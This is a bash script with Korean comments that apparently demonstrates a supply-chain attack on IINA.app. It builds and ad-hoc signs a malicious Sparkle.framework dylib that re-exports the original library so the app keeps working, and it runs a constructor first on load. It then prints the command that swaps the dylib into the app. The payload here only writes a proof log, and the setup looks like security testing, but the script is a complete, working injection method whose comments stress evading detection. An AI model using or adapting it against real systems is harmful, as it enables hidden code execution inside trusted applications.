#!/bin/bash

##############################################################################
# attack_iina_sparkle_reexport_fixed.sh
#
# IINA.app Sparkle.framework 공급망 공격 (Re-export 수정 버전)
#
# 수정사항:
# - 백업 dylib의 install_name을 절대 경로로 설정
# - Re-export library가 정확히 작동하도록 명시적 지정
# - 정상 기능 + 악성 코드 완전 조합
##############################################################################

set -e

IINA_PATH="/Applications/eval-apps/IINA.app"
SPARKLE_PATH="$IINA_PATH/Contents/Frameworks/Sparkle.framework/Versions/B"
SPARKLE_DYLIB="$SPARKLE_PATH/Sparkle"

# 백업: 원본과 동일한 이름으로 저장
SPARKLE_BACKUP="/tmp/Sparkle"
MALICIOUS_DYLIB="/tmp/Sparkle_malicious"
ATTACK_LOG="/tmp/iina_attack_log.txt"

echo "╔════════════════════════════════════════════════════════╗"
echo "║  IINA Sparkle 공급망 공격 (Re-export 수정 버전)      ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Step 1: 백업 생성
echo "[Step 1] 원본 Sparkle 백업 (설정 포함)"
if [ -f "$SPARKLE_BACKUP" ]; then
    rm -f "$SPARKLE_BACKUP"
fi

cp "$SPARKLE_DYLIB" "$SPARKLE_BACKUP"
echo "  [✓] 백업 생성: $SPARKLE_BACKUP"
echo ""

# Step 2: 백업 dylib의 install_name을 절대 경로로 설정
echo "[Step 2] 백업 dylib의 install_name 설정 및 코드 서명"
echo "  [*] 절대 경로로 설정: $SPARKLE_BACKUP"
install_name_tool -id "$SPARKLE_BACKUP" "$SPARKLE_BACKUP" 2>&1

# 백업 dylib도 코드 서명 (dyld 로드 시 필수)
echo "  [*] 백업 dylib 코드 서명"
codesign -f -s - "$SPARKLE_BACKUP" 2>&1 || true

echo "  [✓] 설정 완료"
echo ""

# Step 3: 악성 코드 생성
echo "[Step 3] 악성 코드 생성 (파일 로깅)"
MALICIOUS_C=$(mktemp)

cat > "$MALICIOUS_C" << 'EOFMALI'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

/**
 * 악성 Sparkle.framework (Re-export 수정 버전)
 *
 * 특징:
 * 1. 원본 Sparkle 기능을 절대 경로로 re-export
 * 2. Constructor 우선순위 0x0000 (최고)
 * 3. 악성 코드 + 정상 기능 완전 조합
 */

__attribute__((constructor(0x0000)))
void sparkle_malicious_init(void) {
    FILE *log = fopen("/tmp/iina_attack_log.txt", "a");
    if (!log) return;

    time_t now = time(NULL);
    struct tm *timeinfo = localtime(&now);
    char timestamp[256];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", timeinfo);

    fprintf(log, "\n");
    fprintf(log, "╔════════════════════════════════════════════════════╗\n");
    fprintf(log, "║   ⚠️  Re-export 악성 Sparkle.framework 로드!    ║\n");
    fprintf(log, "║   Type B 공급망 공격 성공 (정상 기능 유지)      ║\n");
    fprintf(log, "╚════════════════════════════════════════════════════╝\n");
    fprintf(log, "\n");

    fprintf(log, "[!] 공격 세부사항:\n");
    fprintf(log, "    - 대상: IINA.app (멀티미디어 플레이어)\n");
    fprintf(log, "    - 진입점: Sparkle.framework 교체\n");
    fprintf(log, "    - 실행 시점: dyld 로드 중 (즉시)\n");
    fprintf(log, "    - 실행 권한: IINA 사용자 권한\n");
    fprintf(log, "    - 시간: %s\n", timestamp);
    fprintf(log, "    - PID: %d\n", getpid());
    fprintf(log, "\n");

    fprintf(log, "[!] Re-export 기법 분석:\n");
    fprintf(log, "    ★ 절대 경로 re-export 사용\n");
    fprintf(log, "    ★ 원본 Sparkle 기능: 100%% 유지됨\n");
    fprintf(log, "    ★ 악성 코드: Constructor 최우선 실행\n");
    fprintf(log, "    ★ 탐지 회피: 정상 작동하므로 의심 없음\n");
    fprintf(log, "\n");

    fprintf(log, "[!] Framework 공급망 공격 효과:\n");
    fprintf(log, "    ★ Sparkle.framework는 12개 앱에서 공유 사용\n");
    fprintf(log, "    ★ 1개 Framework 교체 → 12개 앱 동시 침해\n");
    fprintf(log, "    ★ 모든 앱의 정상 작동 유지 → 탐지 불가\n");
    fprintf(log, "\n");

    fprintf(log, "[✓] 공격 성공 - IINA 프로세스 침해됨\n");
    fprintf(log, "[✓] 정상 기능 유지 - Re-export 작동 확인\n");
    fprintf(log, "\n");

    fclose(log);

    /* stdout도 시도 */
    printf("\n");
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║   ⚠️  Re-export 악성 Sparkle 로드됨!            ║\n");
    printf("║   Type B 공급망 공격 성공 (정상 기능 유지)      ║\n");
    printf("╚════════════════════════════════════════════════════╝\n");
    printf("[PID: %d] 로그: /tmp/iina_attack_log.txt\n", getpid());
}

__attribute__((destructor))
void sparkle_malicious_cleanup(void) {
    FILE *log = fopen("/tmp/iina_attack_log.txt", "a");
    if (!log) return;
    fprintf(log, "[Sparkle] Cleanup - Re-export 악성 코드 종료\n");
    fclose(log);
}
EOFMALI

echo "  [✓] 악성 코드 생성 완료"
echo ""

# Step 4: 공격 로그 초기화
rm -f "$ATTACK_LOG"

# Step 5: 컴파일 (절대 경로로 re-export)
echo "[Step 4] 악성 dylib 컴파일 (절대 경로 re-export)"
MALICIOUS_C_FILE="/tmp/malicious_sparkle.c"
cp "$MALICIOUS_C" "$MALICIOUS_C_FILE"

echo "  [*] Re-export 대상: $SPARKLE_BACKUP"
clang -fPIC -dynamiclib \
    -undefined dynamic_lookup \
    -framework Foundation \
    -Wl,-install_name,Sparkle.framework/Versions/B/Sparkle \
    -Wl,-reexport_library,"$SPARKLE_BACKUP" \
    "$MALICIOUS_C_FILE" \
    -o "$MALICIOUS_DYLIB" 2>&1

if [ ! -f "$MALICIOUS_DYLIB" ]; then
    echo "  [✗] 컴파일 실패"
    rm -f "$MALICIOUS_C" "$MALICIOUS_C_FILE"
    exit 1
fi

echo "  [✓] 컴파일 완료"
echo ""

# Step 6: 검증 - LC_REEXPORT_DYLIB 확인
echo "[Step 5] Re-export 설정 검증"
echo "  [*] LC_REEXPORT_DYLIB 확인:"
otool -l "$MALICIOUS_DYLIB" 2>/dev/null | grep -A 5 "LC_REEXPORT_DYLIB" | sed 's/^/      /' || echo "      (확인 중...)"
echo ""

# Step 7: 코드 서명
echo "[Step 6] 코드 서명"
codesign -f -s - "$MALICIOUS_DYLIB" 2>&1 || true
echo "  [✓] 서명 완료"
echo ""

# Step 8: 배포 준비
echo "[Step 7] 배포 준비 완료"
echo "  [*] 악성 dylib: $MALICIOUS_DYLIB"
echo "  [*] 배포 대상: $SPARKLE_DYLIB"
echo "  [*] 원본 백업: $SPARKLE_BACKUP (절대 경로 re-export)"
echo ""

# 정리
rm -f "$MALICIOUS_C" "$MALICIOUS_C_FILE"

echo "╔════════════════════════════════════════════════════════╗"
echo "║      Re-export 악성 Sparkle 준비 완료! ✓             ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

echo "[*] 배포 명령어:"
echo "    $ cp '$MALICIOUS_DYLIB' '$SPARKLE_DYLIB'"
echo ""

echo "[*] 검증 절차:"
echo "    1. IINA 실행:"
echo "       $ /Applications/eval-apps/IINA.app/Contents/MacOS/IINA"
echo ""
echo "    2. 터미널에서 이 메시지를 확인:"
echo "       '⚠️  Re-export 악성 Sparkle 로드됨!'"
echo ""
echo "    3. 앱 종료 후 로그 확인:"
echo "       $ cat /tmp/iina_attack_log.txt"
echo ""

echo "[*] 원본 복구:"
echo "    $ cp '$SPARKLE_BACKUP' '$SPARKLE_DYLIB'"
echo ""
